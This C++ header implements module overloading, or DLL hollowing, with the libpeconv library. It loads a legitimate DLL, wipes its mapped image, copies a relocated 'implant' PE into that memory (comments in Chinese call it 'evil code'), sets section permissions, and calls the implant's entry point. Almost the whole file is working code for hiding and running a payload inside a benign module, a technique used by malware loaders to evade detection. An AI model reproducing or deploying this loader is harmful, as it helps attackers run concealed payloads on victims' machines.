#pragma once

#include <iostream>
#include <peconv.h>

using namespace std;

DWORD translate_protect(DWORD sec_charact)
{
	if ((sec_charact & IMAGE_SCN_MEM_EXECUTE)
		&& (sec_charact & IMAGE_SCN_MEM_READ)
		&& (sec_charact & IMAGE_SCN_MEM_WRITE))
	{
		return PAGE_EXECUTE_READWRITE;
	}
	if ((sec_charact & IMAGE_SCN_MEM_EXECUTE)
		&& (sec_charact & IMAGE_SCN_MEM_READ))
	{
		return PAGE_EXECUTE_READ;
	}
	if (sec_charact & IMAGE_SCN_MEM_EXECUTE)
	{
		return PAGE_EXECUTE_READ;
	}

	if ((sec_charact & IMAGE_SCN_MEM_READ)
		&& (sec_charact & IMAGE_SCN_MEM_WRITE))
	{
		return PAGE_READWRITE;
	}
	if (sec_charact & IMAGE_SCN_MEM_READ) {
		return PAGE_READONLY;
	}

	return PAGE_READWRITE;
}


// 设置各个节的正确权限属性
bool set_sections_access(PVOID mapped, BYTE* implant_dll, size_t implant_size)
{
	DWORD oldProtect = 0;
	// protect PE header
	if (!VirtualProtect((LPVOID)mapped, PAGE_SIZE, PAGE_READONLY, &oldProtect)) return false;

	bool is_ok = true;
	//protect sections:
	size_t count = peconv::get_sections_count(implant_dll, implant_size);
	for (size_t i = 0; i < count; i++) {
		IMAGE_SECTION_HEADER* next_sec = peconv::get_section_hdr(implant_dll, implant_size, i);
		if (!next_sec) break;
		DWORD sec_protect = translate_protect(next_sec->Characteristics);
		DWORD sec_offset = next_sec->VirtualAddress;
		DWORD sec_size = next_sec->Misc.VirtualSize;
		if (!VirtualProtect((LPVOID)((ULONG_PTR)mapped + sec_offset), sec_size, sec_protect, &oldProtect)) is_ok = false;
	}
	return is_ok;
}


bool overwrite_mapping(PVOID mapped, BYTE* implant_dll, size_t implant_size)
{
	HANDLE hProcess = GetCurrentProcess();
	bool is_ok = false;
	DWORD oldProtect = 0;

	//cleanup previous module:
	// 判断加载Dll的内存大小与evil code大小，后者不能比前者大
	size_t prev_size = peconv::get_image_size((BYTE*)mapped);

	if (prev_size) {
		if (!VirtualProtect((LPVOID)mapped, prev_size, PAGE_READWRITE, &oldProtect)) return false;
		memset(mapped, 0, prev_size);
		if (!VirtualProtect((LPVOID)mapped, prev_size, PAGE_READONLY, &oldProtect)) return false;
	}

	if (!VirtualProtect((LPVOID)mapped, implant_size, PAGE_READWRITE, &oldProtect)) {
		if (implant_size > prev_size) {
			cout << "[-] The implant is too big for the target!\n";
		}
		return false;
	}
	// 将evil code 复制过去
	memcpy(mapped, implant_dll, implant_size);
	is_ok = true;

	// set access:
	if (!set_sections_access(mapped, implant_dll, implant_size)) {
		is_ok = false;
	}
	return is_ok;
}


PVOID undo_overloading(LPVOID mapped, char* target_dll)
{
	size_t payload_size = 0;
	BYTE* payload = peconv::load_pe_module(target_dll, payload_size, false, false);
	if (!payload) {
		return NULL;
	}
	// Resolve the payload's Import Table
	if (!peconv::load_imports(payload)) {
		peconv::free_pe_buffer(payload);
		return NULL;
	}
	// Relocate the payload into the target base:
	if (!peconv::relocate_module(payload, payload_size, (ULONGLONG)mapped)) {
		return NULL;
	}
	if (!overwrite_mapping(mapped, payload, payload_size)) {
		return NULL;
	}
	// Free the buffer that was used for the payload's preparation
	peconv::free_pe_buffer(payload);
	return mapped;
}


LPVOID ModuleOverLoading(BYTE* raw_payload, size_t raw_size, char* target_dll)
{
	size_t payload_size = 0;
	// 内存展开PE
	BYTE* payload = peconv::load_pe_module(raw_payload, raw_size, payload_size, false, false);
	// 加载导入表
	if (!peconv::load_imports(payload)) {
		cerr << "[-] Loading imports failed!\n";
		peconv::free_pe_buffer(payload);
		return NULL;
	}
	// 加载dll
	LPVOID mapped_address = LoadLibraryEx(target_dll, NULL, DONT_RESOLVE_DLL_REFERENCES);
	cout << "[*] Target Dll Load At: " << hex << mapped_address << endl;
	if (!peconv::relocate_module(payload, payload_size, (ULONGLONG)mapped_address)) {
		cerr << "[-] Failed to relocate the implant!\n";
		return NULL;
	}
	cout << "[*] Trying to overwrite the mapped DLL with the implant!" << endl;
	// 镂空覆写
	if (!overwrite_mapping(mapped_address, payload, payload_size)) {
		undo_overloading(mapped_address, target_dll);
		return NULL;
	}
	cout << "[*] Overwrite successfully!" << endl;
	// Free the buffer that was used for the payload's preparation
	peconv::free_pe_buffer(payload);

	return mapped_address;
}



int run_implant(PVOID mapped, DWORD ep_rva, bool is_dll)
{
	ULONG_PTR implant_ep = (ULONG_PTR)mapped + ep_rva;

	cout << "[*] Executing Implant's Entry Point: " << hex << implant_ep << "\n";
	if (is_dll) {
		//run the implant as a DLL:
		BOOL(*dll_main)(HINSTANCE, DWORD, LPVOID) = (BOOL(*)(HINSTANCE, DWORD, LPVOID))(implant_ep);
		cout << "[*] Dll main's Entry Point: " << hex << dll_main << endl;
		//system("pause");
		BOOL res = dll_main((HINSTANCE)mapped, DLL_PROCESS_ATTACH, 0);
		return res;
	}
	//run the implant as EXE:
	BOOL(*exe_main)(void) = (BOOL(*)(void))(implant_ep);
	BOOL res = exe_main();
	return res;
}